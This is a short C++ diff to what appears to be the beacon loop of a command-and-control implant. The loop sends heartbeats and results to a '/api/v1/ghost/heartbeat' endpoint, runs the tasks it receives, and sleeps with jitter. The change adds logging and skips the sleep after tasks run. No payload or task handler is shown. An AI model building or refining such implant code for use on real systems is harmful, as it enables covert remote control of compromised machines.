@@ -64,13 +64,19 @@ public:
         LOG_INFO("Starting beacon")
 
         while (true) {
-            LOG_INFO("[BEACON] Heartbeat sent")
+            if (!pendingResults.empty()) {
+                LOG_INFO("[BEACON] Sending {} results", pendingResults.size())
+            } else {
+                LOG_INFO("[BEACON] Heartbeat sent (idle)")
+            }
             
             HeartbeatRequestDto heartbeat;
             heartbeat.id = uuid;
             heartbeat.results = pendingResults;
 
             std::string rawResponse = client.sendHttpRequest("POST", "/api/v1/ghost/heartbeat", heartbeat.toJson());
+
+            bool taskExecuted = false;
             
             if (!rawResponse.empty()) {
                 pendingResults.clear();
@@ -91,9 +97,16 @@ public:
                     for (const auto& task : instructions.tasks) {
                         processTask(task);
                     }
+
+                    taskExecuted = true;
                 }
             } else {
                 LOG_ERROR("Response was empty")
+            }
+
+            if (taskExecuted) {
+                LOG_INFO("Tasks executed. Skipping sleep to send data immediately.")
+                continue;
             }
 
             sleepWithJitter();
